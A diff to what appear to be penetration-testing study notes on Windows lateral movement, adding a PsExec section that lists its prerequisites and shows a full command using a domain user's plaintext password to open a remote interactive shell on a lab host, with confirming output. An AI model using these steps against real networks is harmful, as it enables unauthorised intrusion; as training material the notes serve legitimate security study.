@@ -131,6 +131,30 @@ FILES04
 ```
 {% endcode %}
 
+## PsExec
+
+It is possible to misuse this tool for lateral movement, but three requisites must be met. First, the user that authenticates to the target machine needs to be part of the Administrators local group. Second, the ADMIN$ share must be available, and third, File and Printer Sharing has to be turned on. Luckily for us, the last two requirements are already met as they are the default settings on modern Windows Server systems.
+
+{% code title="Obtaining an Interactive Shell on the Target System with PsExec" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Tools\SysinternalsSuite> ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+
+PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+Microsoft Windows [Version 10.0.20348.169]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>hostname
+FILES04
+
+C:\Windows\system32>whoami
+corp\jen
+```
+{% endcode %}
+
 ## Pass the hash
 
 PTH only works for NTLM authentication, not for Kerberos authentication.
